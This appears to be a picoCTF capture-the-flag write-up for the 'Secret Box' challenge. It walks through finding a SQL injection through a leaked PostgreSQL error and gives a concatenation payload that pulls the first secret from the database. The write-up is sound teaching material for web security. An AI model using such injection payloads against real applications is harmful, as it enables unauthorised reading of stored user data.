URL : [Secret Box](https://play.picoctf.org/practice/challenge/747?category=1&difficulty=2&page=1)

# Introduction
In this picoCTF challange, we have to deal with one of the most common vulnerabilities in web applications `SQL Injection`

The application is `Secret Vault` which allows users to store their secret with unique ID for each secret. Can we trust this application? I do not think so

# Issue

So why would I assume that this application is not secure at all? Here is the answer.
I tried to enter random character and I ended up finding this in the `secrets\create\`
```
error: INSERT INTO secrets(owner_id, content) VALUES ('8ca5eb63-ca3e-4d13-bf83-b70045309003', ''') - unterminated quoted string at or near "''')"
    at parseErrorMessage (/challenge/node_modules/pg-protocol/dist/parser.js:305:11)
    at Parser.handlePacket (/challenge/node_modules/pg-protocol/dist/parser.js:143:27)
    at Parser.parse (/challenge/node_modules/pg-protocol/dist/parser.js:37:38)
    at Socket.<anonymous> (/challenge/node_modules/pg-protocol/dist/index.js:11:42)
    at Socket.emit (node:events:517:28)
    at addChunk (node:internal/streams/readable:368:12)
    at readableAddChunk (node:internal/streams/readable:341:9)
    at Readable.push (node:internal/streams/readable:278:10)
    at TCP.onStreamRead (node:internal/stream_base_commons:190:23)
```
Now I can observe and learn the SQL command that they used to insert the input into the vault database. So they have a table called `secrets` and with 2 attributes `owner_id` and `content`. Our goal is reading the content of admin supposed to be on the top (Assumably)


So I came up with this payload
```
'|| (SELECT content FROM secrets LIMIT 1) ||'
```

By inserting the payload inside the input and use `||` to escape input string in order to execute the SQL command for me to read the content of `secrets` table and display only 1 row which is the admin's secret.

Happy Hacking!@#@#!$!@
